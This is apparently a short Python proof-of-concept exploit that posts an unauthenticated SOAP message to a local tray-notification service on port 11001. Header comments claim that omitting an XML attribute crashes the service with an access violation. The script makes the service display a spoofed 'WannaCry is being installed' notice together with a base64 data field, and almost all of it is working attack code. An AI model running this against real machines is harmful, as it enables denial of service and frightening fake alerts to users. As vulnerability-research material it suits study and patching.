#!/usr/bin/python

# XML-attribute is required: <ResourceIds> 10 </ResourceIds>
# no server-side validation about the availability of 
# omit the XML-attribute "ResourceIds" leads to ACCESS_VIOLATION

import requests
import json
import html
import base64

action_payload=1*"A"
TrayIconUrl="http://localhost:11001/traynotifierservice"
header={"User-Agent":action_payload,
	"Content-Type":"text/xml; charset=utf-8",
	"SOAPAction":action_payload
	}

payload="AAAA"
payload=str(base64.b64encode(payload.encode()))[2:-1]

SOAPMsg='<?xml version="1.0" encoding="UTF-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService"> \
<SOAP-ENV:Body> \
<traynotifierservice:ShowNotification> \
<CallbackEndpoint>http://localhost:11000/clientagent</CallbackEndpoint> \
<IconHandle>1</IconHandle> \
<NotifyMessage>WannaCry wird installiert :-)... Best regards, L4y3r8</NotifyMessage> \
<b64Data>'+payload+'</b64Data> \
<nNotifyIcon>1</nNotifyIcon> \
</traynotifierservice:ShowNotification> \
</SOAP-ENV:Body> \
</SOAP-ENV:Envelope>'

try:
	r=requests.post(TrayIconUrl, data=SOAPMsg.encode(), headers=header)
#	r=requests.get(TrayIconUrl, params=payload, headers=header, timeout=60.0)
except requests.exceptions.RequestException as err:
	print("[-] Error...")
	print(err)
try:
	print(r)
	print(r.text)
except NameError as err:
	print("[-] Error...")
	print(err)
